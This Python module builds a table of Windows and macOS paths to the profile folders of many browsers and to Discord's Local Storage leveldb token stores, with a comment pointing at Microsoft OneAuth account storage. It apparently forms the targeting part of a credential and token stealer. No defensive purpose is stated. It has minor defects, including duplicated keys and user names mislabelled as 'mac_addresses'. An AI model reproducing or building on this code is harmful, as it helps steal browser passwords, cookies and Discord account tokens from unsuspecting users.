import os
Paths = {}


def generateWindowsPaths():
    local_appdata = os.getenv('LOCALAPPDATA')
    default_appdata = os.getenv('APPDATA')

    # C:\Users\%USER%\AppData\Local\Microsoft\OneAuth\accounts

    # Browsers
    Paths["browser"] = {}
    Paths["browser"]["chrome"] = local_appdata + \
        "\\Google\\Chrome\\User Data\\"
    Paths["browser"]["firefox"] = local_appdata + \
        "\\Mozilla\\Firefox\\Profiles\\"
    Paths["browser"]["opera"] = default_appdata + \
        "\\Opera Software\\Opera Stable\\"
    Paths["browser"]["edge"] = local_appdata + \
        "\\Microsoft\\Edge\\User Data\\"
    Paths["browser"]["brave"] = local_appdata + \
        "\\BraveSoftware\\Brave-Browser\\User Data\\"
    Paths["browser"]["vivaldi"] = local_appdata + \
        "\\Vivaldi\\User Data\\"
    Paths["browser"]["safari"] = local_appdata + "\\Apple Computer\\Safari\\"
    Paths["browser"]["tor"] = local_appdata + \
        "\\Tor Browser\\Browser\\TorBrowser\\Data\\Browser\\profile."
    Paths["browser"]["maxthon"] = local_appdata + "\\Maxthon3\\Users\\"
    Paths["browser"]["epic"] = local_appdata + \
        "\\Epic Privacy Browser\\User Data\\"
    Paths["browser"]["avast"] = local_appdata + \
        "\\AVAST Software\\Browser\\User Data\\"
    Paths["browser"]["chromium"] = local_appdata + \
        "\\Chromium\\User Data\\"
    Paths["browser"]["comodo"] = local_appdata + \
        "\\Comodo\\Dragon\\User Data\\"
    Paths["browser"]["torch"] = local_appdata + "\\Torch\\User Data\\"
    Paths["browser"]["360"] = local_appdata + \
        "\\360Browser\\Browser\\User Data\\"
    Paths["browser"]["blisk"] = local_appdata + "\\Blisk\\User Data\\"
    Paths["browser"]["brave"] = local_appdata + \
        "\\BraveSoftware\\Brave-Browser\\User Data\\"
    Paths["browser"]["centbrowser"] = local_appdata + \
        "\\CentBrowser\\User Data\\"
    Paths["browser"]["chromium"] = local_appdata + \
        "\\Chromium\\User Data\\"

    Paths["discord"] = {}

    Paths["discord"]["discord"] = default_appdata + \
        "\\Discord\\Local Storage\\leveldb"
    Paths["discord"]["discordcanary"] = default_appdata + \
        "\\discordcanary\\Local Storage\\leveldb"
    Paths["discord"]["discordptb"] = default_appdata + \
        "\\discordptb\\Local Storage\\leveldb"


def generateMacPaths():
    # get the mac addresses for the chrome paths
    mac_addresses = os.listdir("/Users/")

    # Browsers
    Paths["browser"] = {}
    Paths["browser"]["chrome"] = "/Users/{}/Library/Application Support/Google/Chrome/Default".format(
        mac_addresses[0])
    Paths["browser"]["firefox"] = "/Users/{}/Library/Application Support/Firefox/Profiles".format(
        mac_addresses[0])
    Paths["browser"]["edge"] = "/Users/{}/Library/Application Support/Microsoft Edge/Default".format(
        mac_addresses[0])
    Paths["browser"]["brave"] = "/Users/{}/Library/Application Support/BraveSoftware/Brave-Browser/Default".format(
        mac_addresses[0])
    Paths["browser"]["vivaldi"] = "/Users/{}/Library/Application Support/Vivaldi/Default".format(
        mac_addresses[0])
    Paths["browser"]["safari"] = "/Users/{}/Library/Safari".format(
        mac_addresses[0])
    Paths["browser"]["tor"] = "/Users/{}/Library/Application Support/TorBrowser-Data/Browser/profile.default".format(
        mac_addresses[0])
    Paths["browser"]["maxthon"] = "/Users/{}/Library/Application Support/Maxthon3/Profiles".format(
        mac_addresses[0])
    Paths["browser"]["epic"] = "/Users/{}/Library/Application Support/Epic/Default".format(
        mac_addresses[0])
    Paths["browser"]["avast"] = "/Users/{}/Library/Application Support/AVAST Software/Browser/Default".format(
        mac_addresses[0])
    Paths["browser"]["chromium"] = "/Users/{}/Library/Application Support/Chromium/Default".format(
        mac_addresses[0])
